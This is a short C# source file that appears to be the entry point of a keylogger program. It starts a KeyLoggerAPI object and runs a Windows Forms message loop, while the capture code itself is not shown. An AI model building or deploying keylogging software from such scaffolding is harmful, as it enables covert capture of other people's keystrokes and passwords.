using System;
using System.Windows.Forms;
namespace KeyLogger
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var api = new KeyLoggerAPI())
            {
                api.Start();
                Application.Run();
            }
        }
    }
}
